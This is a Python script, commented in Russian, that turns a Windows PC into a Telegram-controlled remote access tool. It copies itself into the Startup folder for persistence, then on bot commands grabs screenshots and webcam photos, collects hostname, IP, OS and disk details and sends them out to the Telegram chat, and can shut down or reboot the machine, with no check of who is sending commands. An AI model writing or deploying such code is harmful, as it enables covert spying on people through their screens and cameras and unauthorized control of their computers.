import telebot
import pyautogui
import subprocess
import os
import socket
import platform
import psutil
import cv2
from PIL import Image

# Путь к текущему каталогу, где находится скрипт
current_directory = os.path.dirname(os.path.abspath(__file__))

# Имя Python скрипта, который вы хотите добавить в автозагрузку
script_name = "script.py"

# Полный путь к Python скрипту
script_path = os.path.join(current_directory, script_name)

# Путь к каталогу автозагрузки пользователя
startup_directory = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Проверяем, что скрипт еще не добавлен в автозагрузку
if not os.path.isfile(os.path.join(startup_directory, script_name)):
    # Копируем скрипт в каталог автозагрузки
    destination = os.path.join(startup_directory, script_name)
    subprocess.Popen(['copy', script_path, destination], shell=True)
    print(f"Скрипт {script_name} добавлен в автозагрузку.")

# Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
bot = telebot.TeleBot('YOUR_BOT_TOKEN')

# Переменная для отслеживания ожидания фото/видео
waiting_for_media = False

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    screenshot_button = telebot.types.KeyboardButton("Скриншот")
    shutdown_button = telebot.types.KeyboardButton("Выключить")
    info_button = telebot.types.KeyboardButton("Информация")
    reboot_button = telebot.types.KeyboardButton("Перезагрузка")
    webcam_button = telebot.types.KeyboardButton("Вебка")
    media_button = telebot.types.KeyboardButton("Открыть фото/видео")
    
    markup.row(screenshot_button, shutdown_button, info_button)
    markup.row(reboot_button, webcam_button)
    markup.row(media_button)
    
    # Отправляем уведомление
    bot.send_message(message.chat.id, "Скрипт запущен")
    
    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Скриншот")
def take_screenshot(message):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    with open('screenshot.png', 'rb') as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove('screenshot.png')

@bot.message_handler(func=lambda message: message.text == "Выключить")
def shutdown_computer(message):
    subprocess.Popen(['shutdown', '/s', '/t', '1'])
    bot.send_message(message.chat.id, "Компьютер будет выключен через 1 секунду.")

@bot.message_handler(func=lambda message: message.text == "Перезагрузка")
def reboot_computer(message):
    subprocess.Popen(['shutdown', '/r', '/t', '1'])
    bot.send_message(message.chat.id, "Компьютер будет перезагружен через 1 секунду.")

@bot.message_handler(func=lambda message: message.text == "Информация")
def get_system_info(message):
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    os_info = platform.platform()
    
    disk_info = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint).percent
            disk_info.append(f"{part.device}: {usage}%")
        except PermissionError:
            disk_info.append(f"{part.device}: Недоступен")
    
    info_message = "Имя хоста: {}\nIP-адрес: {}\nОС: {}\nДиски:\n{}".format(hostname, ip_address, os_info, '\n'.join(disk_info))
    bot.send_message(message.chat.id, info_message)

@bot.message_handler(func=lambda message: message.text == "Вебка")
def capture_webcam_photo(message):
    # Ищем все доступные вебкамеры
    webcam_count = len(cv2.VideoCapture(0).read())
    if webcam_count > 0:
        # Подключаемся к первой найденной вебкамере
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            # Сохраняем фотографию
            cv2.imwrite('webcam_capture.png', frame)
            with open('webcam_capture.png', 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove('webcam_capture.png')
        cap.release()
    else:
        bot.send_message(message.chat.id, "Вебкамера не найдена.")

@bot.message_handler(func=lambda message: message.text == "Открыть фото/видео")
def wait_for_media(message):
    global waiting_for_media
    waiting_for_media = True
    bot.send_message(message.chat.id, "Жду материал. Отправьте фото или видео.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    global waiting_for_media
    if waiting_for_media:
        # Получаем фото и сохраняем его
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('downloaded_media.jpg', 'wb') as media_file:
            media_file.write(downloaded_file)
        
        # Открываем и показываем фото
        img = Image.open('downloaded_media.jpg')
        img.show()
        
        bot.send_message(message.chat.id, "Фото получено и открыто.")
        waiting_for_media = False
    else:
        bot.send_message(message.chat.id, "Не ожидал фото.")

@bot.message_handler(content_types=['video'])
def handle_video(message):
    global waiting_for_media
    if waiting_for_media:
        # Получаем видео и сохраняем его
        file_id = message.video.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('downloaded_media.mp4', 'wb') as media_file:
            media_file.write(downloaded_file)
        
        # Открываем и показываем видео
        cap = cv2.VideoCapture('downloaded_media.mp4')
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow('Video', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()
        
        bot.send_message(message.chat.id, "Видео получено и открыто.")
        waiting_for_media = False
    else:
        bot.send_message(message.chat.id, "Не ожидал фото или видео.")

@bot.message_handler(func=lambda message: True)
def handle_other_messages(message):
    bot.reply_to(message, "Используйте кнопки на клавиатуре для управления.")

bot.polling()